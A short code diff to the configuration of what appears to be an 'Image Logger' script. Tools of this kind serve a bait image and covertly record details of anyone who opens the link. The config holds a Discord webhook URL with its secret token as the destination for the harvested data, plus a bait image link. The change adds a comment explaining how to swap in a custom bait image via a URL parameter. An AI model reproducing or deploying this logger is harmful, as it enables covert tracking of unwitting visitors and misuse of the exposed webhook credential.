@@ -12,7 +12,8 @@ __author__ = "771"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1379123868291174533/zkif2uCITqI-MY8OzXrn6i54WAnqiG9xW7SDeK8B_tySDa7J7O5Ee_xNnz5IxlxuPwx9",
-    "image": "https://asianmoviepulse.com/wp-content/uploads/2020/10/vinland-saga-990x557.jpg"
+    "image": "https://asianmoviepulse.com/wp-content/uploads/2020/10/vinland-saga-990x557.jpg", # You can also have a custom image by using a URL argument
+                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     # CUSTOMIZATION #
     "username": "Image Logger", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
